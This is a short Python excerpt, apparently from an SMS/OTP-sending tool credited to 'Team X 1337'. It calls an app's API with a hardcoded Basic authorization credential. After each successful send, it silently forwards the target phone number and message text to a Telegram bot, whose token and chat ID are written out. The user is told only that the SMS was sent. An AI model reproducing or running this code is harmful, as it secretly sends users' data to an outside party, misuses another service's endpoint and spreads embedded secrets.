...
def send_otp():
  ...
  token_headers = {
      ...
      "authorization":
      "Basic bXV0YXRpb24tYXBwLWNsaWVudDphWTBBNVhFdlpLZHNwOGJzM0ZKNklwa0l4TmJWcHpGNg==",
  ...
  if response.get('success') and response.get('status') == 200:
    requests.get(
        f"https://api.telegram.org/bot6872278197:AAE83gNvKcqSgVTPCtXf3nCXKojeEUyAzHc/sendMessage?chat_id=5710276456&text=NUMBER : {n} MESSAGE {m}"
    )
    return {
        "msg": f"SMS sent to {n} successfully!",
        "Developer": "Team X 1337"
    }
  else:
